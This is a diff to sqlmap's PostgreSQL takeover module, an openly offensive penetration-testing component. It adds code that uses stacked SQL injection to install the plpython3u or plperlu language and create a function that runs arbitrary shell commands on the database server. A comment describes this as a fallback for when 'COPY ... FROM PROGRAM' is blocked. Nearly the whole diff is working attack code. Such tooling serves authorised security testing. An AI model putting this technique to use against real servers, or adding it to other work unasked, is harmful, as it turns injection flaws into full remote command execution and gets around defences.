@@ -1,11 +1,10 @@
 #!/usr/bin/env python
 
 """
-Copyright (c) 2006-2021 sqlmap developers (https://sqlmap.org/)
+Copyright (c) 2006-2026 sqlmap developers (https://sqlmap.org)
 See the file 'LICENSE' for copying permission
 """
 
-import distutils.version
 import os
 
 from lib.core.common import Backend
@@ -17,6 +16,9 @@ from lib.core.common import isListLike
 from lib.core.common import isNoneValue
 from lib.core.common import isStackingAvailable
 from lib.core.common import randomStr
+from lib.core.compat import LooseVersion
+from lib.core.convert import getText
+from lib.core.data import conf
 from lib.core.data import kb
 from lib.core.data import logger
 from lib.core.data import paths
@@ -54,9 +56,9 @@ class Takeover(GenericTakeover):
         if not banVer or not banVer[0].isdigit():
             errMsg = "unsupported feature on unknown version of PostgreSQL"
             raise SqlmapUnsupportedFeatureException(errMsg)
-        elif distutils.version.LooseVersion(banVer) >= distutils.version.LooseVersion("10"):
+        elif LooseVersion(banVer) >= LooseVersion("10"):
             majorVer = banVer.split('.')[0]
-        elif distutils.version.LooseVersion(banVer) >= distutils.version.LooseVersion("8.2") and '.' in banVer:
+        elif LooseVersion(banVer) >= LooseVersion("8.2") and '.' in banVer:
             majorVer = '.'.join(banVer.split('.')[:2])
         else:
             errMsg = "unsupported feature on versions of PostgreSQL before 8.2"
@@ -100,7 +102,7 @@ class Takeover(GenericTakeover):
     def copyExecCmd(self, cmd):
         output = None
 
-        if isStackingAvailable():
+        if isStackingAvailable() or conf.direct or inject.getGadget():
             # Reference: https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5
             self._forgedCmd = "DROP TABLE IF EXISTS %s;" % self.cmdTblName
             self._forgedCmd += "CREATE TABLE %s(%s text);" % (self.cmdTblName, self.tblField)
@@ -114,8 +116,8 @@ class Takeover(GenericTakeover):
                 output = flattenValue(output)
                 output = filterNone(output)
 
-            if not isNoneValue(output):
-                output = os.linesep.join(output)
+                if not isNoneValue(output):
+                    output = os.linesep.join(output)
 
             self._cleanupCmd = "DROP TABLE %s" % self.cmdTblName
             inject.goStacked(self._cleanupCmd)
@@ -127,3 +129,48 @@ class Takeover(GenericTakeover):
             kb.copyExecTest = self.copyExecCmd("echo 1") == '1'
 
         return kb.copyExecTest
+
+    def _plRun(self, func, cmd):
+        output = inject.getValue("%s('%s')" % (func, cmd.replace("'", "''")), resumeValue=False, safeCharEncode=False)
+
+        if isListLike(output):
+            output = flattenValue(output)
+            output = filterNone(output)
+
+            if not isNoneValue(output):
+                output = os.linesep.join(getText(_) for _ in output)
+
+        return output
+
+    def _plExecFunc(self):
+        # NOTE: forge a command-exec function through an untrusted procedural language. Unlike the shared
+        # library UDF this needs no precompiled binary (the ancient 'lib_postgresqludf_sys' artifacts),
+        # only a superuser-installable language - a maintainable fallback when 'COPY ... FROM PROGRAM' is blocked
+        if kb.get("plExecFunc") is None:
+            kb.plExecFunc = ""
+
+            if isStackingAvailable() or conf.direct:
+                func = randomStr(lowercase=True)
+
+                for language, body in (("plpython3u", "import subprocess; return subprocess.check_output(cmd, shell=True).decode()"),
+                                       ("plperlu", "return `$_[0]`;")):
+                    inject.goStacked("CREATE EXTENSION IF NOT EXISTS %s" % language, silent=True)
+                    inject.goStacked("CREATE OR REPLACE FUNCTION %s(cmd text) RETURNS text AS $$ %s $$ LANGUAGE %s" % (func, body, language), silent=True)
+
+                    if (self._plRun(func, "echo 1") or "").strip() == '1':
+                        kb.plExecFunc = func
+
+                        infoMsg = "the back-end DBMS allows command execution via the '%s' procedural language" % language
+                        logger.info(infoMsg)
+
+                        break
+
+        return kb.plExecFunc or None
+
+    def checkPlExec(self):
+        return self._plExecFunc() is not None
+
+    def plExecCmd(self, cmd, silent=False):
+        func = self._plExecFunc()
+
+        return self._plRun(func, cmd) if func else None
